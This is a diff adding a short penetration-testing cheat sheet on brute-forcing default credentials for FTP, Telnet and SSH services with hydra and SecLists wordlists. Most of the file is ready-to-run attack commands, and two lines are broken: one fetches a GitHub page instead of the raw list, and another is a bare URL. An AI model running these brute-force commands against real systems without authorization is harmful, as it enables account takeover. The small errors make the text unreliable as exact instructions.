@@ -1,0 +1,22 @@
+Brute force attacks can be carried out on detected SSH, FTP and Telnet services during network penetration tests.
+
+Useful Wordlist
+https://github.com/danielmiessler/SecLists
+
+X-Servers.txt files should be written as ip:port type like;
+	10.0.0.1:21
+	10.0.0.2:22
+	10.0.0.3:23
+	10.0.0.4:10021
+
+## FTP
+$ wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt
+$ hydra -C ftp-betterdefaultpasslist.txt -vV -M FTP-Servers.txt ftp -o FTP-Brute-results
+ 
+## Telnet
+$ wget https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/telnet-betterdefaultpasslist.txt
+$ hydra -C telnet-betterdefaultpasslist.txt -vV -M Telnet-Servers.txt telnet -o Telnet-Brute-results
+ 
+## SSH
+$ https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt
+$ hydra -vV -C ssh-betterdefaultpasslist.txt -M SSH-Servers.txt -o SSH-Brute-results ssh
